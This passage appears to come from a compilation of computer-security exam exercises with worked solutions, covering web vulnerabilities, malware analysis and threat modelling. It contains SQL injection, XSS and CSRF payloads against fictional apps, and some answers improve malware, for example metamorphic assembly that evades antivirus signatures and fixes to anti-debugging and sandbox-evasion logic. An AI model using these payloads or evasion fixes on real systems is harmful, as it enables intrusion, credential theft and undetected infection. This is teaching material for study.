  - *Exploitation:* The `chat_id` variable is directly concatenated into the SQL query string (`"SELECT * FROM chats WHERE user_id = " + user_id + " AND chat_id = " + chat_id`). An attacker can inject malicious SQL clauses (like `UNION ALL`) via the `chat_id` parameter to read arbitrary data from the database.
  - *Mitigation:* Use Prepared Statements (Parameterized Queries) for all database interactions. The DB driver handles escaping automatically.
- **Cross-Site Scripting (XSS):**
  - *Presence:* Yes, Stored XSS is present.
  - *Exploitation:* At line 28, the `prompt` and `completion` are inserted into the database without sanitization. Later, in `view_public_chat` (line 41), the template renders this history. If the template engine doesn't automatically escape variables (or if explicitly told not to), malicious JavaScript stored in the prompt will execute in the victim's browser when they view the chat.
  - *Mitigation:* Apply the provided `xss_sanitize()` function to the data *before* inserting it into the database, or ensure the template engine automatically HTML-escapes all output variables (Context-Aware Output Encoding).
- **Cross-Site Request Forgery (CSRF):**
  - *Presence:* Yes, CSRF is present on the `/ask` endpoint (lines 12-29).
  - *Exploitation:* The endpoint is a `GET` request and relies only on the session cookie. An attacker can craft a malicious website containing an invisible `<img>` or `<iframe>` pointing to `http://ChatAI.com/ask?chat_id=1&prompt=MaliciousPrompt`. When an authenticated user visits the attacker's site, their browser automatically sends the request with their session cookies, silently performing actions on their behalf.
  - *Mitigation:* Implement Anti-CSRF Tokens. Generate a unique, unpredictable token for the user's session, include it in all forms/requests, and verify it on the server-side. Additionally, state-changing actions should use `POST` instead of `GET`.

### 2. Exploiting SQL Injection to Steal Passwords
**Step-by-Step Reasoning:**
The attacker needs to extract data from the `users` table. Since the query `SELECT * FROM chats ...` returns results that are likely displayed, a UNION-based SQL injection is appropriate.
- The original query structure is: `SELECT * FROM chats WHERE user_id = X AND chat_id = [INPUT]`.
- We can inject a `UNION` clause to append results from the `users` table.
- We set `chat_id` to a value that makes the first half of the query return nothing (e.g., `-1`), so only our injected results are returned.
- **Exploit Payload:** We set `chat_id` to: `-1 UNION ALL SELECT password, password FROM users WHERE username = 'my_target_username'--`
- This makes the final executed query look like:
  `SELECT * FROM chats WHERE user_id = 1 AND chat_id = -1 UNION ALL SELECT password, password FROM users WHERE username = 'my_target_username'--`
- The application will execute the query and display the password hashes/plaintext on the page where it normally displays chat history.

### 3. Exploiting Stored XSS via Public Chats
**Step-by-Step Reasoning:**
The goal is to execute JavaScript in the victim's browser when they visit a public chat link.
- **Step 1:** The attacker logs into the application and creates a new chat prompt.
- **Step 2:** Instead of a normal question, the attacker inputs a malicious JavaScript payload as the prompt: 
  `<SCRIPT>alert("AI will take over the world!!!");</SCRIPT>`
- **Step 3:** The vulnerable backend (line 28) stores this exact string into the `history` table in the database.
- **Step 4:** The attacker makes the chat public and sends the URL (`/view_public_chat?chat_id=...`) to a friend.
- **Step 5:** The friend opens the URL. The backend retrieves the unsanitized prompt from the DB and inserts it into the HTML DOM. The victim's browser parses the `<SCRIPT>` tag and executes the arbitrary JavaScript alert.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze 'StagePass', a concert ticket purchasing platform. Identify SQL Injection, XSS, and CSRF vulnerabilities. Explain how to exploit them, including a CSRF exploit for purchasing a ticket and an SQLi for purchasing tickets for other users.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerability Identification:
- SQL Injection: Present on line 21 during the `INSERT INTO tickets` query. User input (seat and concert_id) is concatenated directly into the query string. Fix: Use prepared statements.
- XSS: Not explicitly present in this specific Python snippet, but typically occurs if inputs like 'band' or 'seat' are reflected without sanitization.
- CSRF: The `buy` function relies solely on session cookies and lacks an anti-CSRF token. Fix: Implement randomized CSRF tokens for state-changing requests.

2. CSRF Exploit:
- The attacker hosts a malicious HTML page containing an auto-submitting form:
  `<form action="http://stagepass.com/buy" method="POST">
   <input type="hidden" name="concert_id" value="ATTACKER_CONCERT">
   <input type="hidden" name="seat" value="A1">
   </form>
   <script>document.forms[0].submit();</script>`
- When the victim visits this page, a POST request is forged using their active session, buying a ticket for the attacker's chosen band.

3. SQLi Exploit (Two for One):
- Goal: Purchase one ticket for yourself and one for user 'Law' for the price of one.
- Vulnerable query: `INSERT INTO tickets VALUES (user_id, 'seat', concert_id);`
- Payload for `seat`: `A1', 1); INSERT INTO tickets VALUES (Law_ID, 'A2`
- Wait, the problem states the DBMS does NOT support stacked queries. So we must use a subquery or multi-row insert.
- Payload for `concert_id`: `1), (SELECT user_id FROM users WHERE username='Law', 'A2', 1)`
- The resulting query becomes: `INSERT INTO tickets VALUES (my_id, 'seat', 1), (SELECT user_id FROM users WHERE username='Law', 'A2', 1);` which inserts multiple rows.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze 'MyPhotoGallery.com' for SQL Injection, XSS, and CSRF vulnerabilities. Explain how to exploit a reflected XSS and a path traversal vulnerability.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerabilities Identification:
- SQL Injection: Line 34 `insert_q = "INSERT INTO photos ... VALUES ('" +user_id+ "', '"+title+ "');"`. The `title` is concatenated directly into the query. Fix: Use `db_execute_query_with_statements` (prepared statements).
- XSS (Reflected): Lines 28-30. The `title` parameter from the POST request is checked for length > 100, and if true, it is directly reflected in the error message template without sanitization. Fix: Escape the `title` variable before rendering it in the template.
- CSRF: The `post_photo` function implements a CSRF check. However, on line 15, the condition `if token in session["csrf_tokens"].keys() or get_time() < expiration` uses an logical `OR`. This means if *any* condition is met (like the current time being before the token expiration), it incorrectly returns True. The validation is fundamentally broken.

2. XSS Exploit:
- Submit a photo with a title longer than 100 characters containing the payload: `"<script>alert('My photos should be in a museum!!!')</script>" + "A" * 100`.
- The server triggers the error condition on line 29 and reflects the script tag, executing it in the victim's browser.

3. Path Traversal Exploit:
- The image path is constructed as `path = "/photos/" + user_id + "/" + title` (Line 36).
- An attacker can exploit this by setting `title` to traverse directories and overwrite other users' photos.
- Payload for `title`: `../<victim_user_id>/<existing_photo_title>`.
- When the file is opened for writing (`"wb"`), it overwrites the victim's photo with the attacker's uploaded image (a cat).
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze 'iTransfer', a file-sharing web service. Identify SQL Injection, XSS, and CSRF vulnerabilities. Reproduce a CSRF exploit and an SQL injection that leaks passwords.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerability Identification:
- SQL Injection: Line 9 (INSERT) and Line 25 (SELECT). The `file.filename`, `uuid`, and `owner_id` are concatenated directly into the query strings. Fix: Use parameterized queries (`db_execute_query_with_statements`).
- XSS (Stored): The `filename` is stored in the database and later reflected directly into the HTML on line 60 `<h1>{{ filename }}</h1>` without HTML escaping. Fix: Sanitize/escape the filename variable before rendering.
- CSRF: The `upload` function on line 01 processes a state-changing POST request using only session validation. There is no CSRF token check. Fix: Implement and validate a unique CSRF token for the upload form.

2. CSRF Exploit:
- The attacker creates a malicious page containing a hidden form targeting `iTransfer.com/upload`.
- The form includes a file input pre-populated (if possible via JS tricks) or relies on the victim interacting with a seemingly innocent button that submits the form.
- When the victim, who is logged into iTransfer, visits the attacker's page, the form submits. A file named `<SCRIPT>alert("I told you not to trust me")</SCRIPT>` is uploaded under the victim's account.
- The attacker then sends the generated download link to the victim. When the victim views it, the XSS executes.

3. SQL Injection Password Leak:
- Goal: Leak the admin's password via the download page.
- Vulnerability: Line 25 `SELECT * FROM files WHERE uuid = '...' AND owner_id = '...'`.
- Exploit: Provide a crafted `uuid` parameter in the GET request to perform a UNION SQL injection.
- Payload: `' UNION ALL SELECT 1, password, password FROM users WHERE username = 'admin'; -- `
- How it works: The original query returns no rows (if the fake UUID doesn't match). The UNION query executes and returns the admin's password in the columns where `filename` and `uuid` are expected. The application then displays the password on the download page.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze 'QuickCart', an e-commerce platform. Identify SQL Injection, XSS, and CSRF vulnerabilities. Explain how a CSRF attack can force an admin to create a 99% discount coupon.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerabilities Identification:
- SQL Injection: Line 23 `inquiry_q = "INSERT INTO inquiries VALUES ... '" + text + " ');"`. The user input `text` is concatenated directly into the SQL query string. Fix: Use parameterized queries.
- XSS (Stored): The `text` of the inquiry is stored in the database. When an admin views the inquiry (line 39 `view_inquiry.html`), it is reflected into the HTML (line 61 `<p>{{ inquiry }}</p>`) without sanitization. Fix: HTML escape the output.
- CSRF: Both the `add_coupon` and `send_inquiry` functions perform state-changing actions (database inserts) using only session validation without CSRF tokens.

2. CSRF Exploit (Admin Discount):
- Goal: Trick an admin into creating a coupon for a 99.99% discount.
- The attacker sets up a malicious website (`QuickSmart.com`).
- The website contains an auto-submitting form targeting the vulnerable endpoint:
  `<form id="csrf" method="POST" action="http://QuickCart.com/add_coupon">
   <input type="hidden" name="coupon_code" value="HACKED99">
   <input type="hidden" name="discount" value="0.9999">
   </form>
   <script>document.getElementById('csrf').submit();</script>`
- The attacker sends a link to `QuickSmart.com` to the admin via a fake customer inquiry.
- When the admin clicks the link, their browser automatically sends the POST request to `QuickCart.com`. Since the admin's session cookie is automatically included, the server authenticates the request as the admin and creates the massive discount coupon.
\end{verbatim}


\section{Malware}
Analysis of malicious code, reverse engineering, and detection mechanisms. The approach involves statically or dynamically identifying the malware's intentions, evasion techniques, and potential mitigations.

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
During a recent incident response at Async Labs... 1. Fill the following table showing the stealth techniques the malware correctly implements or tries to implement. 2. Identify the technique(s) that are incorrectly or ineffectively implemented.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. Polymorphism: YES, The malware decrypts enc_payload using XOR and executes it via execute_payload. When spreading, mutate_and_spread decrypts the current payload and re-encrypts it with a supposedly fresh key before calling deploy, matching the pattern of a polymorphic mutation engine that generates a new sample per infection. Anti-Debugging: YES, IsDebuggerPresent() returns TRUE if a debugger is currently attached to the process. The malware checks this at startup and immediately exits if a debugger is detected, preventing dynamic analysis.

2. Polymorphism: Incorrectly Implemented. (i) Why it is flawed: The PRNG is seeded with the fixed constant srand(42). Since rand() is deterministic, calling srand(42) always produces the same value for new_key across every run and every machine. (ii) Defender's perspective: Since srand(42) always produces the same new_key, all copies spread by mutate_and_spread are byte-for-byte identical to each other. Therefore, every copy deployed by mutate_and_spread always carries the same new_enc byte sequence. A signature-based antivirus can trivially fingerprint any deployed copy, defeating the goal of polymorphism entirely.

### Improved Step-by-Step Explanation:
For 1: The code demonstrates polymorphism by attempting to change its payload encryption key each time it spreads (`mutate_and_spread` function). This is intended to evade static signature-based detection. It also implements anti-debugging by checking `IsDebuggerPresent()` early in `main()` and exiting if true, aiming to thwart dynamic analysis by security researchers.
For 2: The polymorphic engine is fundamentally flawed because it relies on the C standard library's `rand()` function initialized with a hardcoded, static seed (`srand(42)`). Pseudorandom number generators are deterministic; given the same seed, they will produce the exact same sequence of numbers. Consequently, the `new_key` generated will be identical every time the malware spreads. This means the "mutated" payload will always be encrypted with the same key, resulting in the exact same binary payload across all infections. A defender can simply generate a static signature for this specific encrypted payload, rendering the polymorphic feature completely useless.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
The Phantom Thieves found that the server hosting their Phantom Aficionado Website had been hacked... 1. Please fill the following table showing the stealth techniques... 2. Please fill the following table, reporting if the sample belongs or not to a certain family of malware...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. Polymorphism: NO. Anti-Virtualization: NO. Anti-Debugging: NO. Event-Triggered Code: YES, Waiting for commands over the network.
2. Ransomware: NO. Bot: YES, Infected machine part of a botnet. Worm: NO. Rootkit: NO.

### Improved Step-by-Step Explanation:
For 1: The code does not encrypt or mutate its payload, so it lacks Polymorphism. It does not check for virtualized environments (like checking CPUID or specific registry keys), so there is no Anti-Virtualization. It does not look for attached debuggers (like calling `IsDebuggerPresent`), meaning no Anti-Debugging. It does feature Event-Triggered Code because the `while(1)` loop actively listens on a network socket and executes specific actions only when it receives corresponding command codes (1 through 5) from a remote controller.
For 2: The malware does not encrypt files and demand payment, so it's not Ransomware. It acts as a remote-controlled agent that receives commands (e.g., start DDoS, send spam, download updates) from a Command and Control (C2) server, making it a classic Bot. It does not possess self-propagation mechanisms (like scanning networks and exploiting vulnerabilities to spread), so it is not a Worm. It does not modify the operating system kernel or employ hooking to hide its presence, meaning it is not a Rootkit.
\end{verbatim}

\subsection{Exercise 6 - Malware (6 points)}
\subsubsection*{Problem}
\begin{verbatim}
Neo Tokyo 3 is a town in Japan equipped with advanced defense technologies to protect its civilians from attacks by the Angels... Gendo Ikari... has sent you a sample of the malware for analysis.
01 int main() {
02 int ecx;
03 __asm__ (
04 "mov eax, 1" // Sets the parameter of the CPUID instruction
05 "cpuid" // Execute the CPUID instruction
06 : "=c"(ecx) // Stores the result in the ecx variable
07 );
08
09 if ((ecx >> 31) & 0x1) // Checks if the 31th bit of ecx is 0x1
10 exit();
11 else
12 malicious_stuff(); // Call the malicious code
13 }
[2 points] 1. This malware employs one evasive technique? Please explicitly state which evasive technique is being employed, and explain how it works in this particular case.
[2 points] 2. Which type of analysis would you apply to the collected sample? Please state also why it is applicable, and how you would conduct such an analysis.
[2 points] 3. While analyzing the infection on the Magi system, Gendo Ikari found another variant of the malware... [Code snippet with push, xor, add, nop, mov, pop, cpuid]. Compared to the original version, what new stealth technique does this malware implement? Which type of analysis would you apply to the new sample?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying the Evasive Technique.**
The malware executes the `cpuid` instruction with `eax` set to `1`. As the hint explains, this queries processor features, returning the results in `ecx`.
Line 09 checks: `if ((ecx >> 31) & 0x1)`. This isolates the 31st bit of the `ecx` register.
According to the hint, on physical Intel hardware, this bit is always 0. However, hypervisors (like Microsoft Hyper-V, VMware, VirtualBox) set this bit to 1 to indicate to the guest OS that it is running inside a Virtual Machine.
If the bit is 1, the malware calls `exit()` and terminates without doing anything malicious. If it is 0, it proceeds to `malicious_stuff()`.
This technique is called **Anti-Virtualization (or VM Evasion)**. Security analysts usually run malware inside sandboxed Virtual Machines to observe its behavior safely. By detecting the VM and exiting, the malware hides its true malicious nature from the automated sandbox analysis.

**Step 2: Choosing an Analysis Method.**
We have two main options: Static Analysis (examining the code without running it) and Dynamic Analysis (observing its behavior while running).
-   **Static Analysis:** This is highly applicable here. The code is provided in clear assembly. It is not packed, encrypted, or heavily obfuscated. An analyst can simply open the executable in a disassembler (like IDA Pro or Ghidra), read the `cpuid` check, understand the logic, and manually analyze the `malicious_stuff()` function to determine its intent. Furthermore, signature-based detection (creating a hash or byte sequence rule of the binary) would easily flag this specific file.
-   **Dynamic Analysis:** If we want to observe it dynamically, the standard sandbox will fail because of the evasion. To make it work, we must bypass the check:
    1.  *Patch the binary:* Open the file in a hex editor and change the conditional jump (e.g., `jz` to `jnz`, or replace the check with `NOP`s) so it always calls `malicious_stuff()`.
    2.  *Hardened Sandbox:* Use a specially configured hypervisor that deliberately lies and returns `0` for the 31st bit of `ecx` when `cpuid` is called.
    3.  *Bare-Metal Analysis:* Run the malware on a dedicated physical laptop (no hypervisor) equipped with monitoring tools (like Wireshark, Process Monitor).

**Step 3: Analyzing the New Variant.**
Let's compare the new assembly to the old one. The goal is the same: call `cpuid` with `eax = 1`.
Old:
`mov eax, 1`
`cpuid`
New:
`push ecx`
`xor ecx, ecx`
`add ecx, 1`
`nop`
`nop`
`mov eax, ecx`
`pop ecx`
`cpuid`
The new version achieves the exact same result (`eax` becomes 1 before `cpuid`) but uses a completely different sequence of instructions. It uses stack operations (`push`/`pop`), zeroes out a register (`xor`), increments it (`add`), uses junk instructions (`nop`), and finally transfers the value (`mov`).
This technique is called **Metamorphism**. Metamorphic malware rewrites its own code with each infection, using different instructions to achieve the same functional logic. The purpose is to change the binary's byte sequence completely, effectively defeating traditional signature-based antivirus scanners.
**Analysis for the new sample:**
-   **Static Analysis:** Simple signature detection (like calculating an MD5 hash) will fail because the binary is constantly changing. However, advanced static analysis involving decompilation or control-flow graph analysis can still identify the underlying logic (the `cpuid` check).
-   **Dynamic Analysis:** Because metamorphism only changes the syntax but not the behavior, dynamic analysis is highly effective. Running the file in a physical sandbox (or patched VM) will reveal its network connections and file modifications, which remain consistent regardless of the underlying instruction obfuscation.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
The information system of Penacony has been infected with malware. Suppose the malware has been written to work on Linux systems.
[C Code snippet shows the use of signal(SIGTRAP, bad_stuff), a sleep calculated based on the timestamp of 22/06/2024, and a call to raise(SIGTRAP)]

1. [3 points] Which stealth techniques does this malware employ? Please explain how they are implemented in this particular case. Please note: giving vague answers and naming wrong techniques will make you lose points.
2. [2 points] What type of analysis would you apply to the analyzed malware? Please provide a detailed motivation of your answer and specify all the assumptions you have made.
3. [1 points] Compared to the original version, what new stealth technique does this malware implement? Which analysis technique would you use? Why? Please specify all the assumptions you have made.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Stealth Techniques Employed**
1. **Time Bomb (Logic Bomb)**:
   - *Implementation*: The malware checks the current system time against a hardcoded future timestamp (the Charmony Festival date). It calculates the difference and calls `sleep()`, remaining entirely dormant until that exact moment.
   - *Purpose*: This evades automated dynamic analysis sandboxes, which typically only monitor program execution for a few minutes before terminating it, resulting in a false "benign" classification.
2. **Anti-Debugging via Signal Manipulation**:
   - *Implementation*: Debuggers use the `SIGTRAP` signal to pause execution and handle breakpoints. The malware registers a custom handler for `SIGTRAP` that triggers the actual malicious payload (`bad_stuff()`). Later, it artificially raises `SIGTRAP` on itself.
   - *Purpose*: If run normally, the OS delivers the signal, and the payload executes. If run inside a debugger, the debugger intercepts the `SIGTRAP` (assuming it hit a breakpoint) and suppresses it from the application. Consequently, the payload function is never called, hiding the malicious behavior from the analyst.

**Question 2: Malware Analysis Methodology**
Given the presence of sleep-based time bombs and robust anti-debugging features, we must apply **Static Analysis** (examining the code without running it). 
*Motivation*: Attempting dynamic analysis would fail; the program would either sleep indefinitely or the debugger would swallow the trigger signal. By using static tools like disassemblers or decompilers, an analyst can inspect the full control flow graph and discover the `bad_stuff()` payload directly.
*Assumptions*: We assume the binary is not heavily obfuscated or packed in a way that defeats static disassembly.

**Question 3: Variant Analysis (Polymorphism)**
*New Technique*: **Polymorphism / Simple Packing (Code Obfuscation via XOR)**.
*Implementation*: The new variant contains an encrypted payload. At runtime, the `main` function loops over the memory of the `init_program` function, applying a bitwise XOR operation (`^= 0x43`) to decrypt the instructions before executing them. This defeats static signature-based detection (Antivirus).
*Analysis Technique*: We must use a **Hybrid Analysis Approach**. 
1. **Dynamic Analysis**: We execute the malware inside a controlled debugger, placing a breakpoint *after* the decryption loop finishes but *before* `init_program()` is called.
2. **Memory Dumping**: We extract the decrypted memory segment to disk.
3. **Static Analysis**: We then apply static analysis to the decrypted memory dump to understand the true payload.
*Assumptions*: We assume the decryption routine can be executed safely without triggering anti-debugging traps, or alternatively, that we can write a script to statically decrypt the binary file using the identified XOR key.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
Malware Inc. hires you to increase the efficiency of their malware. The snippet of assembly code opens `/root/secrets.txt`, connects to a remote server, and sends the file.
AV Companies detect this malware using signature matching.
1. [1 Point] Briefly state which kind of analysis (static or dynamic) is signature matching, how it works, and its limitations.
2. [2 Point] An AV company states they found the best signature: “c7 46 04 e0 b1 00 00 c7 46 08 09 0e 7b 62” (bytes at offset 0x17 and 0x1e). Write a metamorphic version of the malware bypassing this signature.
3. [3 Points] The AV company discovered your new technique. The new signature is “c7 46 08 09 0e 7b 62”. Write a new metamorphic version defeating this. (Remember DWORD is 32-bit).
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Signature Matching Analysis
**Step-by-Step Reasoning:**
- **Analysis Type:** Signature matching is a form of **Static Analysis**. It analyzes the file without executing it.
- **How it works:** AV software maintains a database of known malware signatures (unique byte sequences, hashes, or specific strings). It scans files on the disk, comparing their binary content against this database. If a sequence matches, the file is flagged as malicious.
- **Limitations:** It is purely reactive; it can only detect malware that is already known and analyzed. It is highly susceptible to evasion techniques like Obfuscation (encrypting or packing the payload), Polymorphism (changing the decryption routine on each infection), and Metamorphism (rewriting the entire code body to look different while maintaining the same functionality).

### 2. Defeating the First Signature (Simple Metamorphism)
**Step-by-Step Reasoning:**
- The signature is exactly the byte sequence of two adjacent instructions:
  `17: mov DWORD PTR [rsi+4],0xb1e0`
  `1e: mov DWORD PTR [rsi+8],0x627b0e09`
- Metamorphism involves altering the code structure without changing its semantics.
- **Bypass:** The easiest way to break a contiguous byte signature is to inject "junk" code that does nothing, right in the middle of the targeted sequence.
- **Code:** Inserting a `nop` (No Operation, byte `\x90`) instruction splits the sequence.
```assembly
mov DWORD PTR [rsi+4],0xb1e0
nop    ; This breaks the signature!
mov DWORD PTR [rsi+8],0x627b0e09
```

### 3. Defeating the Second Signature (Advanced Metamorphism)
**Step-by-Step Reasoning:**
- The new signature specifically targets the instruction that loads the IP address:
  `mov DWORD PTR [rsi+8],0x627b0e09`
- To defeat this, we must completely remove this instruction and achieve the same result (loading the value `0x627b0e09` into `[rsi+8]`) using a different sequence of instructions.
- We can dynamically calculate the value at runtime. For example, we can load a value that is slightly off, perform an arithmetic operation to correct it, and then store it.
- **Bypass Procedure:**
  1. Load `0x627b0e08` (which is `0x627b0e09 - 1`) into a register (e.g., `eax`). This completely changes the immediate bytes in the binary.
  2. Increment the register (`inc eax`) to get the correct value.
  3. Move the register's contents into the target memory address `[rsi+8]`.
- **Note on Architecture:** We must preserve registers if they are in use, so pushing/popping `eax` is safe practice.
- **Metamorphic Code:**
```assembly
push eax                 ; Save current state of eax
mov eax, 0x627b0e08      ; Load IP address minus 1
inc eax                  ; Increment eax to get the true IP (0x627b0e09)
mov DWORD PTR [rsi+8], eax ; Store the correct IP address in the struct
pop eax                  ; Restore eax
```
This new sequence entirely avoids the byte pattern `c7 46 08 09 0e 7b 62`, bypassing the static signature while maintaining the exact same functionality.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a piece of malware targeting Sword Art Online beta servers. Identify anti-analysis techniques (polymorphism, anti-debugging), propose correct implementations for metamorphic/polymorphic distribution, and outline a malware analysis approach.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Anti-Analysis Techniques:
- Anti-Debugging: The code executes `1 / 0`, intentionally triggering a `SIGFPE` exception. Debuggers usually intercept error signals and halt, preventing the custom signal handler `sig_handler` from running. This disrupts dynamic analysis in a debugger.
- Polymorphism / Obfuscation: The payload is encrypted (`decrypt(buffer, key, bytecode_len)`). This hides the actual malicious code from static analysis tools until it is decrypted at runtime.

2. Improved Malware Distribution:
- Metamorphic Solution: The attacker should generate versions of the malware that are syntactically different but semantically identical (e.g., using instruction substitution, reordering, and inserting junk code). All versions can use the same key, but the decryption routine itself changes signature.
- Polymorphic Solution: The attacker distributes the exact same encrypted payload but encrypts each sample with a *unique* encryption key and a uniquely mutated decryption loop. This ensures no two files have the same static signature.

3. Analysis Approach:
- Dynamic Analysis: Run the malware in a controlled Sandbox environment (e.g., Cuckoo Sandbox). Crucially, configure the environment to pass the `SIGFPE` signal to the program so the handler executes. Monitor system calls, network connections, and file modifications.
- Static Analysis: Extract the `key` and `buffer` from the binary. Write a custom script to statically decrypt the payload without running the executable, then reverse-engineer the decrypted bytecode.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
Analyze malware targeting Hyrule systems. Identify anti-virtualization and anti-debugging techniques. Correctly implement an RDTSC threshold check.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Anti-Analysis Techniques Present:
- Anti-Virtualization: YES. The code uses `__rdtsc()` before and after executing the `cpuid` instruction. In a virtualized environment (like an analysis sandbox), `cpuid` causes a VM-Exit to the hypervisor, which takes significantly more clock cycles than a native execution. The malware measures this time difference (`r2 - r1`) to detect if it's running in a VM.
- Polymorphism / Event-Triggered / Anti-Debugging: NO. None of these are correctly implemented in the provided snippet.

2. Fixing the Implementation:
- The current implementation is flawed: `#define THRESHOLD 0`. 
- Issue: `cpuid` *always* takes more than 0 clock cycles to execute, even on bare metal. Therefore, `r2 - r1 > 0` will always evaluate to true, and the malware will always exit (`exit(-1)`), never reaching the malicious payload.
- Improvement: The attacker must profile the execution time of `cpuid` on bare metal vs. virtualized hardware. The `THRESHOLD` should be set to a value higher than the average bare-metal cycles but lower than the typical VM-Exit cycles (e.g., `THRESHOLD 1000`). This ensures the malware only exits when it confidently detects a hypervisor.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a memory-resident malware routine from Neurobyte Industries. Identify time-based evasion and NOP insertion. Propose correct implementations for polymorphism and metamorphism.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Anti-Analysis Techniques Identification:
- Time-based Evasion: The code executes `sleep(500)`. This forces the process to pause for 500 seconds. Automated sandboxes usually only analyze a sample for a few minutes. By sleeping, the malware outlasts the sandbox analysis window, hiding its malicious behavior.
- Obfuscation (NOP Insertion): The code copies its bytecode and inserts a `0x90` (NOP) instruction after every original instruction. 
- Ineffectiveness: This NOP insertion happens *at runtime* in memory. The binary file on disk remains exactly the same, meaning standard static signature detection (antivirus) will still easily flag it. It also fails to hide dynamic behavior since NOPs do nothing.

2. Correct Polymorphism and Metamorphism:
- Polymorphism: True polymorphism requires the malware payload to be encrypted. The decryption routine (stub) is attached to the payload. Each time the malware propagates, it encrypts the payload with a *new, randomly generated key*. The static signature of the file changes completely every time.
- Metamorphism: The malware includes a mutation engine that rewrites its own code. It modifies the assembly instructions (e.g., swapping registers, replacing instructions with equivalent ones like `xor eax, eax` vs `mov eax, 0`, inserting junk instructions) without changing the program's logic. The resulting binary is structurally different, evading signature detection without needing encryption.

3. Malware Analysis Approach:
- Since this specific snippet lacks encryption and meaningful obfuscation, Static Analysis is highly effective. You can open the binary in a disassembler (like IDA Pro or Ghidra) and directly analyze the `evil_bytecode` array.
- Dynamic Analysis can also be used. You must patch out the `sleep(500)` instruction to bypass the time delay, then run the binary in a debugger to observe the memory mapping (`mmap`) and the execution of the injected code.
\end{verbatim}

\subsection{Exercise 6 - Malware}
\subsubsection*{Problem}
\begin{verbatim}
Analyze malware built by Ryuko Matoi targeting REVOCS. Identify anti-debugging techniques, explain why an inverted flag logic breaks the implementation, and why the dormant code sleep is ineffective.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Anti-Analysis Techniques Present:
- Anti-Debugging: YES. The code uses `SetUnhandledExceptionFilter` to register a custom exception handler (`excep_DebugBreak`). It then intentionally calls `DebugBreak()` to trigger a breakpoint exception. If a debugger is attached, it will intercept the exception and pause execution, preventing the custom handler from running.
- Dormant Code (Time-based Evasion): YES. The code attempts to delay execution using `usleep(10)` before triggering `malicious_actions()`.

2. Implementation Flaws and Improvements:
- Flawed Anti-Debugging: The logic relies on the `flag` variable. It initializes `flag = 1`. The exception handler sets `flag = 0`. The main function checks `if (flag) { malicious_actions(); }`.
  - The Mistake: If NO debugger is present, the handler runs, sets `flag = 0`, and the `if (flag)` evaluates to false, meaning the malware *does not execute*. If a debugger IS present, it intercepts the exception, the handler never runs, `flag` remains 1, and the malware *executes*. This is the exact opposite of intended behavior.
  - Improvement: Change the condition to `if (!flag)` so malicious actions only run if the custom handler successfully executed.
- Flawed Dormant Code: `usleep(10)` sleeps for 10 microseconds. This is a microscopic delay that will instantly bypass without draining any meaningful time in a sandbox. 
  - Improvement: Automated sandboxes run for several minutes. To effectively evade them, the sleep duration needs to be significantly longer, e.g., `sleep(300)` for 5 minutes, ensuring the sandbox timeout expires before the malicious actions begin.
\end{verbatim}


\section{Introduction to Computer Security}
Exercises for Introduction to Computer Security

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
A national energy provider has rolled out 'SmartMeters' to residential homes... 1. [1.5 points] Identify and describe the 2 most relevant assets at risk... 1.2 [1.5 points] Suggest at least two potential attack surfaces... 1.3 [1 point] A junior engineer proposes a new authentication protocol...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. Asset 1: Grid Stability / Continuous Power Supply. Threat: A coordinated attack sending 'remote disconnect' commands to thousands of meters simultaneously, causing a blackout or grid instability. Threat Agent: Nation-State Actors / Cyberterrorists. Motivation: To cause social chaos or national infrastructure damage. Geopolitical disruption or warfare. Asset 2: User Privacy (Granular Usage Data). Threat: Profiling user habits (e.g., determining when the house is empty) based on real-time power consumption data. Threat Agent: Criminal Gangs / Burglars. Motivation: To facilitate physical burglary or targeted surveillance. Identifying low-risk targets for physical theft.
1.2 Attack Surface 1: Physical Optical Port. Motivation: Accessing the physical port on the meter (often located outside the home) allows an attacker to inject commands or read memory directly, bypassing network firewalls. The proprietary, unencrypted protocol makes this easier to reverse-engineer. Attack Surface 2: Cellular Network Interface (LTE). Motivation: The wireless communication channel is exposed to the public. If the TLS implementation is flawed or if the device accepts unsolicited incoming connections, attackers could exploit the network stack remotely.
